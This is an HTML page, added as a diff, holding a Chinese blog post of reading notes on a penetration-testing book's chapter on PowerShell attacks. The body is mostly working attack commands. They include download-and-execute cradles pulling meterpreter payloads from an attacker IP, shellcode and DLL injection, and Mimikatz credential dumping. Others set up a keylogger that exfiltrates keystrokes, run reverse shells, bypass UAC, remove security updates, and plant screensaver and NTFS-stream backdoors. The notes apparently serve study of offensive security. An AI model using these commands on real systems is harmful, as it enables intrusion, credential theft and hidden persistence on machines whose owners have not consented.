@@ -1,0 +1,865 @@
+<!DOCTYPE html>
+
+
+<html lang="zh_CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta name="description" content="Limbus的个人博客" />
+      
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>0x04 PowerShell 攻击 |  Limbus&#39; Blog</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/H-Limbus/h-limbus.github.io@latest/favicon.png" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+<script>
+var _hmt = _hmt || [];
+(function() {
+	var hm = document.createElement("script");
+	hm.src = "https://hm.baidu.com/hm.js?afbc0b35e48d80d18aee387ad0d30121";
+	var s = document.getElementsByTagName("script")[0]; 
+	s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    <link rel="alternate" href="/atom.xml" title="Limbus' Blog" type="application/atom+xml">
+</head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-web安全攻防：渗透测试实战指南读书笔记/web安全攻防：渗透测试实战指南--第六章（PowerShell 攻击）"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  0x04 PowerShell 攻击
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2023/05/15/web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%EF%BC%9A%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%EF%BC%9A%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97--%E7%AC%AC%E5%85%AD%E7%AB%A0%EF%BC%88PowerShell%20%E6%94%BB%E5%87%BB%EF%BC%89/" class="article-date">
+  <time datetime="2023-05-15T07:50:27.710Z" itemprop="datePublished">2023-05-15</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">读书笔记</a> / <a class="article-category-link" href="/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%EF%BC%9A%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97/">Web安全攻防：渗透测试指南</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> Word count:</span>
+            <span class="post-count">3.9k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> Reading time≈</span>
+            <span class="post-count">15 min</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h3 id="6-1-PowerShell技术"><a href="#6-1-PowerShell技术" class="headerlink" title="6.1 PowerShell技术"></a>6.1 PowerShell技术</h3><p>常用的powershell 攻击工具</p>
+<p>powersploit : 常用的后期漏洞利用框架，常用于信息探测、特权提升、凭证窃取、持久化控制等操作。</p>
+<p>Nishang: 集成了框架、脚本和各种payload，包含下载和执行、键盘记录、DNS、延时命令等脚本。</p>
+<p>Empire：基于powershell 的远程控制木马，可以从凭证数据库中导出和跟踪凭证信息</p>
+<p>powercat</p>
+<span id="more"></span>
+<h4 id="6-1-2-基本概念"><a href="#6-1-2-基本概念" class="headerlink" title="6.1.2 基本概念"></a>6.1.2 基本概念</h4><p>1、PS1文件，就是一个简单的文本文件，扩展名.PS1，每个命令显示为独立的一行。</p>
+<p>2、执行策略：为防恶意脚本，Powershell 有个执行策略，默认为受限。在ps脚本无法执行时，可以用 cmdlet命令确定当前的执行策略。</p>
+<p>​	  Get-ExecutionPolicy        Restricted: 脚本不能运行（默认）</p>
+<p>​     RemoteSigned：本地创建的脚本可以运行，但从网上下载的脚本不能运行（拥有数字证书签名的除外）</p>
+<p>AllSigned：仅当脚本由受信任的发布者签名时才能运行</p>
+<p>Unrestricted：允许所有script运行</p>
+<p>也可以用cmdlet 设置执行策略。</p>
+<p><code>Set-ExecutionPolicy &lt;policy name&gt;</code></p>
+<p>3、运行脚本</p>
+<p>相对路径和绝对路径</p>
+<p>4、管道  将一个命令的输出作为另一个命令的输入，用| 连接。</p>
+<h4 id="6-1-3-常用命令"><a href="#6-1-3-常用命令" class="headerlink" title="6.1.3 常用命令"></a>6.1.3 常用命令</h4><p>1、基本知识</p>
+<p>在powershell 下，类似“cmd命令”叫做 “ cmdlet ”，都采用“动词-名词”的形式，如New-Item，动词一般为 Add    New   Get   Remove   Set等，不区分大小写。</p>
+<p>新建目录：New-Item   相当于mkdir</p>
+<p>新建文件：New-Item   相当于 touch </p>
+<p>删除目录：Remove-Item      相当于rm</p>
+<p>显示文本内容：Get-Content     相当于cat</p>
+<p>设置文本内容：Set-Content    是向文件中写入内容，会覆盖之前的内容</p>
+<p>追加内容：Add-Content      追加</p>
+<p>清除内容：Clear-Content   </p>
+<p>2、常用命令</p>
+<p>如果要运行Powershell 脚本程序，必须用管理员权限将restricted 策略改成 unrestricted，所以在渗透时要绕过策略</p>
+<ol>
+<li><p>绕过本地权限执行</p>
+<p>上传xxxx.ps1 至目标服务器，在CMD环境下，在目标环境本地执行该脚本</p>
+<p><code>PowerShell.exe -ExecutionPolicy Bypass -File xxxx.ps1</code></p>
+</li>
+<li><p>本地隐藏绕过权限执行脚本</p>
+<p><code>PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -Nonlnteractive -NoProfile xxxx.ps1</code></p>
+</li>
+<li><p>用IEX下载远程PS1脚本绕过权限执行</p>
+<p><code>PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonIIEX(New-ObjectNet.WebClient).DownloadString(&quot;xxxx.ps1&quot;);[Parameters]</code></p>
+</li>
+</ol>
+<p>ExecutionPolicy Bypass :  绕过执行安全策略，这个参数可以绕过任意一个安全保护规则，基本都要使用</p>
+<p>WindowStyle Hidden :  隐藏窗口</p>
+<p>NoLogo ：启动不显示版权标志的PowerShell</p>
+<p>NonInteractive(-NonI)：非交互模式，PowerShell 不为用户提供交互的提示</p>
+<p>NoProfile(-NoP)：PowerShell控制台不加载当前用户的配置文件</p>
+<p>Noexit:  执行后不退出Shell ，在使用键盘记录等脚本时很重要</p>
+<h3 id="6-2-PowerSploit"><a href="#6-2-PowerSploit" class="headerlink" title="6.2 PowerSploit"></a>6.2 PowerSploit</h3><h4 id="6-2-1-安装"><a href="#6-2-1-安装" class="headerlink" title="6.2.1 安装"></a>6.2.1 安装</h4><p>kali 自带，没有的话用git 安装，但是现在好像已经不维护了，介绍模块：</p>
+<p>AntivirusBypass :  发现杀软的查杀特征</p>
+<p>CodeExecution ：在目标主机执行代码</p>
+<p>Exfiltration ：目标主机上的信息搜集工具</p>
+<p>Mayhem :  蓝屏等破坏性脚本</p>
+<p>Persistenece :  后门脚本（持久控制）</p>
+<p>Recon :  以目标主机为跳板进行内网信息侦察</p>
+<p>ScriptModification :  在目标主机上创建或修改脚本</p>
+<h4 id="6-2-2-实战"><a href="#6-2-2-实战" class="headerlink" title="6.2.2 实战"></a>6.2.2 实战</h4><ol>
+<li><p>Invoke-Shellcode : CodeExecution 模块下的Invoke-Shellcode 脚本常用于将shellcode 插入指定的进程ID或本地PowerShell 中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">先使用msfvenom 命令生成一个powershell 脚本木马</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.118 LPORT=4444 -f powershell -o /var/www/html/test</span><br><span class="line">接着在目标机Powershell 下输入以下命令下载该脚本</span><br><span class="line">IEX(New-ObjectNet.WebClient).DownloadString(&quot;http://192.168.1.118/PowerSploit/CodeExecution/Invoke-Shellcode.ps1&quot;)</span><br><span class="line">接着输入以下命令下载木马</span><br><span class="line">IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.1.118/test&quot;)</span><br><span class="line">下载木马</span><br><span class="line">Invoke-Shellcode -Shellcode ($buf) -Force </span><br><span class="line">运行木马，-Force 是不用提示，直接执行</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>​	指定进程注入 shellcode 反弹 meterpreter shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">同样先在目标机Powershell 下输入以下命令</span><br><span class="line">IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.76.128/Invoke-Shellcode.ps1&quot;)</span><br><span class="line">IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.76.128/test&quot;)</span><br><span class="line"></span><br><span class="line">接着输入Get-Process 命令或者ps 命令查看当前进程</span><br><span class="line">然后输入以下命令创建一个新的进程，启动一个记事本，设置为隐藏，再次查看进程，多了一个notepad 的进程。</span><br><span class="line">Start-Process c:\windows\system32\notepad.exe -WindowStyle Hidden</span><br><span class="line"></span><br><span class="line">接着输入以下命令，使用Invoke-Shellcode脚本进行进程注入</span><br><span class="line">Invoke-Shellcode -ProcessID xxxx -Shellcode($buf) -Force</span><br><span class="line"></span><br><span class="line">MSF 监听端口反弹成功</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><p>Invoke-DllInjection</p>
+<p>Dll 代码注入脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">先下载code Execution 模块下的另一个脚本Invoke-DllInjection</span><br><span class="line">IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.76.128/Invoke-DllInjection.ps1&quot;)</span><br><span class="line">然后使用以下命令在kali 中生成一个Dll注入脚本</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.76.128 lport=4444 -f dll -o /var/www/html/test.dll</span><br><span class="line">使用powershell 下载木马</span><br><span class="line">然后使用以下命令进行注入</span><br><span class="line">Invoke-DllInjection -ProcessID xxxx -Dll C:/test.dll</span><br><span class="line">msf 监听  reverse_tcp 反弹</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Invoke-Portscan</p>
+<p>Invoke-Portscan 是Recon 模块下的一个脚本，主要用于端口扫描</p>
+<p>Invoke-Portscan -Hosts 192.168.1.2,192.168.2.5 -Ports “80, 88,  22”</p>
+</li>
+<li><p>Invoke-Mimikatz</p>
+</li>
+</ol>
+<p>​		Invoke-Mimikatz 是 Exfiltration模块下的一个脚本，先下载脚本</p>
+<p><code>Invoke-Mimikatz -DumpCreds</code> 进入mimikatz界面，关于mimikatz 的用法会单独写一篇</p>
+<ol start="5">
+<li><p>Get-Keystrokes</p>
+<p>是Exfiltration 模块下的一个脚本，用于键盘记录，下载了之后使用 Get-Keystorkes -LogPath C:\test1.txt</p>
+</li>
+</ol>
+<h4 id="6-2-3-PowerUp-攻击模块讲解"><a href="#6-2-3-PowerUp-攻击模块讲解" class="headerlink" title="6.2.3 PowerUp 攻击模块讲解"></a>6.2.3 PowerUp 攻击模块讲解</h4><p>PowerUp 是Privesc 模块下的一个脚本，是拥有众多来寻找目标主机Windows 服务漏洞进行提权的实用脚本</p>
+<p>通常，Windows 下可以通过内核漏洞来提升权限，当无法通过内核漏洞提权时，可以利用脆弱的Windows服务提权，或者利用常见的系统服务，通过其继承的系统来完成提权。</p>
+<p>可以使用get-help [cmdlet] -full 查看帮助</p>
+<p>输入Invoke-AllChecks 会执行模块，这个模块会执行PowerUp下所有的脚本</p>
+<p>输入Find-PathDLLHikack 该模块用于检查当前%PATH%的哪些目录是用户可以写入的</p>
+<p>Get-ApplicationHost | Format-Table -Autosize  列表显示  利用系统上的applicationHost.config 文件恢复加密过的应用池和虚拟目录的密码</p>
+<p>Get-RegistryAlwaysInstallElevated  用于检查AlwaysInstallElevated注册表项是否被设置，如果已被设置，意味者MSI文件是以SYSTEM权限运行</p>
+<p>Get-RegistryAutoLogon 用于检测Winlogin 注册表的AutoAdminLogon项有没有被设置，可查询默认的用户名和密码。</p>
+<p>由于Empire 作者不在维护，就不记录这个工具了。</p>
+<h3 id="6-3-Nishang"><a href="#6-3-Nishang" class="headerlink" title="6.3 Nishang"></a>6.3 Nishang</h3><h4 id="6-3-1-简介"><a href="#6-3-1-简介" class="headerlink" title="6.3.1 简介"></a>6.3.1 简介</h4><p>Nishang 是一款针对Powershell的渗透工具，要在powershell 3.0以上的环境才可以正常使用，win7 自带的是powershell 2.0</p>
+<p>在github中下载了之后，使用 Get-Command -Moudle  nishang  来导入模块。使用Get-Information 查看各个模块的详细信息。</p>
+<h4 id="6-3-2-攻击实战"><a href="#6-3-2-攻击实战" class="headerlink" title="6.3.2 攻击实战"></a>6.3.2 攻击实战</h4><ol>
+<li><p>Check-VM：检测当前机器是否属于一台已知的虚拟机，一些主流的虚拟机。</p>
+</li>
+<li><p>Invoke-CredentialsPhish：欺骗用户输入密码，不输入关闭不了，只能强制关闭进程。</p>
+</li>
+<li><p>Copy-VSS：利用Volume Shadow Copy 服务复制sam文件，如果这个脚本运行在DC机上，ntds.dit和SYSTEM hive 也能被拷贝出来。</p>
+<p><code>Copy-VSS -DestinationDir C:temp</code></p>
+</li>
+<li><p>FireBuster FireListener 扫描器：用于对内网进行扫描，打开本地监听，然后远程传送数据，把包发给FireListener</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">首先在本机输入以下命令</span><br><span class="line">FireListener 130-150</span><br><span class="line">然后在目标机上输入以下命令</span><br><span class="line">FireBuster 192.168.1.1 130-150 -Verbose</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Keylogger 键盘记录</p>
+<p>Get-Help .\Keylogger.ps1 -full 查看帮助文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">\keylogger.ps1   使用这个方法运行，记录会被保存在当前用户Temp目录下的key文件中</span><br><span class="line">\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqPxxxxxxx -MagicString stopthis   checkURL会检测出网站中是否包含 -MagicString,如果有就停止记录。</span><br><span class="line">\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=xxxxxxx -MagicString stopthis -exfil -ExfilOption WebServer -URL http://192.168.1.1/data/catch.php   将记录指定发送给一个可以记录Post请求的Web服务器</span><br><span class="line">\Keylogger.ps1 -persist  持久化记录，重启后依然记录。</span><br><span class="line"></span><br><span class="line">对于记录，输入Nishang Utility的Parse_Keys 来解析，parsed.txt里就会出现解析后的按键记录。</span><br><span class="line">Parse_Keys ./key.log ./parsed.txt</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Get-PassHashes：这个脚本在administrator的权限下可以Dump出密码哈希值，不需要SYSTEM权限就可以DUMP.</p>
+</li>
+<li><p>获取用户的密码提示信息：这个脚本可以从Windows 获取用户密码的提示信息，需要Administrator的权限来读取san hive，可以根据提示信息生成密码字典，能大大提高爆破的成功率   Get-PassHints</p>
+</li>
+</ol>
+<h4 id="6-3-3-Power-Shell-隐藏通信隧道"><a href="#6-3-3-Power-Shell-隐藏通信隧道" class="headerlink" title="6.3.3 Power Shell 隐藏通信隧道"></a>6.3.3 Power Shell 隐藏通信隧道</h4><ol>
+<li><p>基于TCP协议的PowerShell 交互式Shell</p>
+<p>Invoke-PowerShellTcp 是基于TCP协议的PowerShell 正向连接或反向连接Shell，具体参数：</p>
+<p>IPAddress xxx.xxx.xxx.xxx    连接的IP地址</p>
+<p>Port  xxxx         指定端口    -Bind 选项时表示需要监听的端口</p>
+<p>Reverse  反向连接  </p>
+<p>使用NC监听本地端口    nc -lvp 3333</p>
+<p>然后在目标机Power shell下输入以下命令，反弹Shell 到192.168.76.128 的端口3333。</p>
+<p>Invoke-PowerShellTcp -Reverse -IPAddress 192.168.76.128 -Port 3333</p>
+<p>Bind       正向连接</p>
+<p>在目标机Powershell 下执行以下脚本命令</p>
+<p>Invoke-PowerShellTcp -Bind -Port 3333</p>
+<p>在NC 中执行以下命令 nc -nv 192.168.76.128 3333</p>
+</li>
+<li><p>基于UDP协议的PowerShell 交互式 Shell</p>
+<p>Invoke-PowerShellUdp是基于UDP协议的Powershell 正向连接或反向连接Shell。</p>
+<p>正向连接：nc  -nvu 192.168.76.128 3333</p>
+<p>反向连接：nc -lup 3333</p>
+</li>
+<li><p>基于HTTP和HTTPS协议的Power shell交互式Shell</p>
+<p>Invoke-PoshRatHttp和Invoke-PoshRatHttps 是基于HTTP协议和HTTPS协议的powershell 反向连接shell。除了基于TCP和UDP协议的shell，Nishang还支持基于HTTP 和HTTPS协议的shell</p>
+<p>HTTP:  Invoke-PoshRatHttp -IPAddress 192.168.1.1 333</p>
+<p>HTTPS: Invoke-PoshRatHttps -IPAddress 192.168.1.1 333</p>
+</li>
+</ol>
+<h4 id="6-4-4-WebShell-后门"><a href="#6-4-4-WebShell-后门" class="headerlink" title="6.4.4 WebShell 后门"></a>6.4.4 WebShell 后门</h4><p>位于nishang\Antak-WebShell 目录，是一个ASPX的大马，使用PowerShell 的命令，这个大马可以编辑执行脚本、上传、下载文件。</p>
+<h4 id="6-4-5-权限提升"><a href="#6-4-5-权限提升" class="headerlink" title="6.4.5 权限提升"></a>6.4.5 权限提升</h4><ol>
+<li>下载执行</li>
+</ol>
+<p>Download_Execute是Nishang 中的下载执行脚本，常用于下载文本文件，然后转换为可执行文件。</p>
+<p>使用Nishang 中的exetotext.ps1 脚本将木马程序转为文本文件msf.txt           <code> ExetoText   ./msf.exe  ./msf.txt</code></p>
+<p>然后调用Download_Execute脚本下载并执行文本文件。Download_Execute     <code>http://192.168.76.128/msf.txt</code></p>
+<ol start="2">
+<li>Bypass UAC</li>
+</ol>
+<p>User Account Control（用户账户控制）是微软为提高系统安全而在windows vista中引入的新技术，要求用户在执行可能会影响计算机运行或其他用户设置的操作之前，要求权限或管理员密码。在未经许可的情况下，UAC可以防止恶意软件和间谍软件在计算机上进行安装或对计算机进行更改。</p>
+<p>在windows Vista 以及更高的版本中，微软引入安全策略，分为中高低，高等级进程有管理员权限，中等级进程有基本用户权限，低级别进程权限有各种限制。</p>
+<p>UAC 需要授权的动作包括：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">配置Windows Update</span><br><span class="line">增加或删除用户账户</span><br><span class="line">改变用户的账户类型</span><br><span class="line">改变UAC设置</span><br><span class="line">安装ActiveX</span><br><span class="line">安装或卸载程序</span><br><span class="line">安装设备驱动程序</span><br><span class="line">设置家长控制</span><br><span class="line">将文件移动到Program Files或Windows目录</span><br><span class="line">查看其他用户的文件夹</span><br></pre></td></tr></table></figure>
+
+<p>UAC有4中设置要求</p>
+<p>始终通知：最严格的设置，任何时候，当程序使用高级别权限时，都会提示本地用户。</p>
+<p>仅在程序试图更改我的计算机时通知我：UAC默认策略，本地程序使用高权限不通知，第三方程序要求使用高权限时会提示用户。</p>
+<p>和上面一样，但是不降低桌面亮度</p>
+<p>从不提示：当用户为系统管理员，所有程序都会以最高权限运行。</p>
+<p>Invoke-PsUACme模块使用了来自UACME项目的DLL来绕过UAC</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PsUACme -Verbose   使用Sysprep方法并执行默认的Payload</span><br><span class="line">Invoke-PsUACme -method oobe -Verbose   使用oobe方法并执行默认的Payload</span><br><span class="line">Invoke-PsUACme -method oobe -Payload &quot;powershell -Windowstyle hidden -e Your EncodePayload&quot;   使用-payload 参数可以自行指定执行的Payload</span><br><span class="line"></span><br><span class="line">还可以使用-CustomDll64(64位)或-CustomDLL32（32位）</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>删除补丁</li>
+</ol>
+<p>这个脚本可以帮助我们移除系统所有的更新或所有安全更新，以及指定编号更新。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Remove-Update All      移除目标机器上的所有更新</span><br><span class="line">Remove-Update Security    移除目标机器上的所有与安全相关的更新</span><br><span class="line">Remove-Update KB2761226   移除指定编号的更新</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li><p>其他功能</p>
+<p>4.1   端口扫描（Invoke-PortScan）</p>
+<p>使用Get-Help Invoke-PortScan -full 查看帮助信息。startAddress   扫描范围开始的地址</p>
+<p>EndAddress   扫描范围结束的地址</p>
+<p>ScanPort        进行端口扫描</p>
+<p>Port   指定端口</p>
+<p>TimeOut      设置超时时间</p>
+<p>4.2   爆破破解（Invoke-BruteForce）</p>
+<p>是专注于暴力破解的脚本，用于对SQL Server、域控制器、Web及FTP弱口令爆破。</p>
+<p>ComputerName       对于服务的计算机名</p>
+<p>User List                  用户名字典</p>
+<p>PasswordList           密码字典</p>
+<p>Service服务（默认为SQL）</p>
+<p>StopOnSuccess      匹配一个后停止</p>
+<p>Delay                    延迟时间</p>
+<p>4.3  嗅探 </p>
+<p>内网嗅探简单动静大，实在没办法时可以试试</p>
+<p><code>Invoke-Interceptor  -ProxyServer  192.168.76.128 -ProxyPort 9999</code></p>
+<p>4.4 屏幕窃取</p>
+<p>Show-TargetScreen 脚本使用MJPEG传输目标机远程桌面的实时画面，在本机可以使用NC或者PowerCat进行监听，在支持MJPEG的浏览器中也可访问，查看实时画面。</p>
+<p>目标机： <code>Show-TargetScreen -Reverse -IPAddress 192.168.76.128 -Port 5555</code></p>
+<p>本机： <code>netcat -nlvp 5555 | netcat -nlvp 5555</code></p>
+<p>正向连接</p>
+<p>目标机：<code>Show-TargetScreen -Bind -Port 5555</code></p>
+<p>本机：<code>netcat nv 192.168.76.128 5555 | netcat -lnvp 5555</code></p>
+<p>4.5 生成木马</p>
+<p>各个脚本的使用方法基本相同，以生成受感染的Word为例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Payload    后面直接加Payload，需要注意引号的闭合</span><br><span class="line">PayloadURL  传入远程的Payload进行生成</span><br><span class="line">PayloadScript   指定本地的脚本进行生成</span><br><span class="line">Arguments    之后要执行的函数</span><br><span class="line">OutputFile   输出的文件名</span><br><span class="line">WordFileDir   输出的目录地址</span><br><span class="line">Recurse    在WordFileDir 中递归寻找word文件</span><br><span class="line">RemoveDocx  创建完成后删除原始文件</span><br></pre></td></tr></table></figure>
+
+<p>4.6 后门</p>
+<p>（1）HTTP-Backdoor</p>
+<p>可以帮助我们在目标机器上下载和执行PowerShell脚本，接受来自第三方网站的指令，然后在内存中执行。</p>
+<p><code>HTTP-Backdoor -CheckURL http://xxxxx.com/raw.php?i=xxxxx -PayloadURL http://xxxxxx.com/raw.php?i=xxxxxx -MagicString start123 -StopString stopthis</code></p>
+<p>CheckURL   给出一个URL地址，如果存在，MagicString中的值就执行Payload来下载、运行我们的脚本</p>
+<p>PayloadURL   给出需要下载的PowerShell 脚本的地址</p>
+<p>Arguments    指定要执行的函数</p>
+<p>StopString  判断是否存在CheckURL返回的字符串，如果存在则停止执行</p>
+<p>（2）Add-ScrnSaveBackdoor</p>
+<p>利用屏保来留一个隐藏的后门，执行方式如下</p>
+<p><code>Add-ScrnSaveBackdoor -Payload “powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-Process” </code>  使用这条语句可以执行我们生成的Payload</p>
+<p><code>Add-ScrnSaveBackdoor -PayloadURL http://192.168.13.11/Powerpreter.psm1 -Arguments HTTP-Backdoor http://xxxxxx.com/raw.php?i=xxxxx start123 stopthis</code></p>
+<p><code>Add-ScrnSaveBackdoor -PayloadURL http://xxx.xx.xx.xx/code_exec.ps1</code></p>
+<p>也可以使用msfvenom先生成一个PowerShell，然后利用以下命令返回一个Meterpreter</p>
+<p><code>msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.76.128 -f powershell</code></p>
+<p>(3) Invoke-ADSBackdoor</p>
+<p>这个脚本使用NTFS数据流留下一个永久性后门，这个脚本可以向ADS中注入代码并且以普通用户的权限运行，输入以下命令执行脚本。</p>
+<p><code>Invoke-ADSBackdoor -PayloadURL http://192.168.12.110/test.ps1</code></p>
+<p>执行该脚本后， 使用 dir &#x2F;a &#x2F;r 才能看到被写入的文件</p>
+</li>
+</ol>
+ 
+      <!-- reward -->
+      
+      <div id="reword-out">
+        <div id="reward-btn">
+          Donate
+        </div>
+      </div>
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>Copyright： </strong>
+          
+          Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://h-limbus.github.io/2023/05/15/web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%EF%BC%9A%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%EF%BC%9A%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97--%E7%AC%AC%E5%85%AD%E7%AB%A0%EF%BC%88PowerShell%20%E6%94%BB%E5%87%BB%EF%BC%89/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
